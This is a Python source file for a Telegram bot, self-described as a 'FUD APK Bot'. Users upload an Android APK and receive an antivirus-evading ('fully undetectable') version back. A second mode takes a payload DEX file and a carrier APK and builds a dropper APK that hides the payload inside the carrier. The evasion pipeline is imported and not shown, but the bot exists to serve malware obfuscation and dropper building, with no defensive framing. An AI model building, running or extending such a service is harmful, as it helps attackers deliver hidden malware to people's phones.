import os
import asyncio
import uuid
import shutil
import threading
import traceback
import time
from flask import Flask
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)
from telegram.error import Conflict

from config import BOT_TOKEN, WORK_DIR
from pipeline import full_fud_pipeline, full_fud_pipeline_dropper, ensure_tools
from setup import _setup_done, _setup_error


flask_app = Flask(__name__)


@flask_app.route("/")
def home():
    return "FUD Bot alive!", 200


def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, debug=False)


async def _heartbeat(status, stop_event, prefix):
    start = time.time()
    while not stop_event.is_set():
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=25)
            return
        except asyncio.TimeoutError:
            pass
        elapsed = int(time.time() - start)
        try:
            await status.edit_text(f"{prefix}\n⏳ {elapsed}s elapsed (live logs dekho)")
        except Exception:
            pass


async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *FUD APK Bot*\n\n"
        "• APK bhejo → FUD APK milega\n"
        "• /dropper + DEX → phir APK → dropper\n\n"
        "First run pe tools auto-download (2-5 min).",
        parse_mode="Markdown",
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    doc = msg.document if msg else None
    if not doc or not doc.file_name.endswith(".apk"):
        await msg.reply_text("❌ Sirf .apk file bhejo.")
        return

    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)
    input_path = os.path.join(session_dir, "input.apk")
    output_path = os.path.join(session_dir, "fud_output.apk")

    status = await msg.reply_text("⚙️ APK download ho raha hai...")
    stop_hb = asyncio.Event()

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(input_path)
        size_mb = os.path.getsize(input_path) / (1024 * 1024)

        await status.edit_text(f"🔧 Tools check... (APK {size_mb:.1f} MB)")
        hb_task = asyncio.create_task(_heartbeat(status, stop_hb, "🔧 Tools check..."))

        await asyncio.to_thread(ensure_tools)

        stop_hb.set()
        try:
            await hb_task
        except Exception:
            pass
        stop_hb = asyncio.Event()
        hb_task = asyncio.create_task(_heartbeat(status, stop_hb, "🧬 Processing APK..."))

        await status.edit_text("🧬 Processing APK... (logs dekho)")
        await asyncio.to_thread(
            full_fud_pipeline, input_path, output_path, session_dir
        )

        stop_hb.set()
        try:
            await hb_task
        except Exception:
            pass

        await status.edit_text("📤 Uploading...")
        with open(output_path, "rb") as f:
            await msg.reply_document(document=f, filename="fud_ready.apk")
        await status.edit_text("✅ FUD APK ready!")
    except Exception as e:
        tb = traceback.format_exc()
        print(tb, flush=True)
        try:
            await status.edit_text(f"❌ Error:\n`{str(e)[:400]}`", parse_mode="Markdown")
        except Exception:
            try:
                await msg.reply_text(f"❌ Error:\n`{str(e)[:400]}`", parse_mode="Markdown")
            except Exception:
                pass
    finally:
        stop_hb.set()
        shutil.rmtree(session_dir, ignore_errors=True)


async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    doc = msg.document if msg else None
    if not doc:
        return

    fname = doc.file_name or ""
    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)

    try:
        tg_file = await context.bot.get_file(doc.file_id)

        if fname.endswith(".dex"):
            dst = os.path.join(WORK_DIR, "last_payload.dex")
            await tg_file.download_to_drive(dst)
            context.user_data["payload_dex"] = dst
            await msg.reply_text("✅ Payload DEX stored. Ab carrier APK bhejo.")
            return

        if fname.endswith(".apk"):
            payload = context.user_data.get("payload_dex")
            if not payload or not os.path.exists(payload):
                await msg.reply_text("❌ Pehle payload.dex bhejo (caption: /dropper).")
                return

            input_path = os.path.join(session_dir, "carrier.apk")
            output_path = os.path.join(session_dir, "dropper.apk")

            status = await msg.reply_text("⚙️ Carrier download...")
            await tg_file.download_to_drive(input_path)

            await status.edit_text("🔧 Tools check...")
            await asyncio.to_thread(ensure_tools)

            stop_hb = asyncio.Event()
            hb_task = asyncio.create_task(_heartbeat(status, stop_hb, "🧬 Building dropper..."))
            await status.edit_text("🧬 Building dropper...")

            await asyncio.to_thread(
                full_fud_pipeline_dropper,
                input_path, payload, output_path, session_dir,
            )

            stop_hb.set()
            try:
                await hb_task
            except Exception:
                pass

            with open(output_path, "rb") as f:
                await msg.reply_document(document=f, filename="dropper.apk")
            await status.edit_text("✅ Dropper ready!")
            return

        await msg.reply_text("❌ Sirf .apk ya .dex.")
    except Exception as e:
        tb = traceback.format_exc()
        print(tb, flush=True)
        try:
            await msg.reply_text(f"❌ Error:\n`{str(e)[:400]}`", parse_mode="Markdown")
        except Exception:
            pass
    finally:
        shutil.rmtree(session_dir, ignore_errors=True)


async def run_bot():
    # Tools complete hone tak wait karo. Telegram messages queue me rahenge.
    print("[*] waiting for tools before polling...", flush=True)
    while not _setup_done.is_set():
        await asyncio.sleep(2)
    if _setup_error["exc"]:
        print(f"[!] setup failed, bot still starting: {_setup_error['exc']}", flush=True)
    print("[✓] tools ready, starting polling...", flush=True)

    await asyncio.sleep(3)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", handle_start))
    app.add_handler(CommandHandler("dropper", handle_dropper_apk))
    app.add_handler(MessageHandler(
        filters.Document.ALL & filters.CaptionRegex(r"^/dropper"),
        handle_dropper_apk,
    ))
    app.add_handler(MessageHandler(
        filters.Document.FileExtension("apk"),
        handle_apk,
    ))

    try:
        # pending updates DROP MAT karo — user ke bheje APK queue me hai
        await app.bot.delete_webhook(drop_pending_updates=False)
    except Exception as e:
        print(f"[!] delete_webhook: {e}", flush=True)

    await app.initialize()
    await app.start()

    while True:
        try:
            await app.updater.start_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=False,   # <- yahi fix hai
            )
            print("🤖 Bot polling active.", flush=True)
            break
        except Conflict as e:
            print(f"[!] conflict: {e}. retry 10s", flush=True)
            await asyncio.sleep(10)
        except Exception as e:
            print(f"[!] polling err: {e}. retry 5s", flush=True)
            await asyncio.sleep(5)

    await asyncio.Event().wait()


def main():
    os.makedirs(WORK_DIR, exist_ok=True)

    def _boot_setup():
        try:
            ensure_tools()
            print("[✓] boot setup complete", flush=True)
        except Exception:
            traceback.print_exc()

    threading.Thread(target=_boot_setup, daemon=True).start()
    threading.Thread(target=run_flask, daemon=True).start()
    print("[✓] Flask started.", flush=True)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        print("🛑 Stopped.", flush=True)
    finally:
        loop.close()


if __name__ == "__main__":
    main()
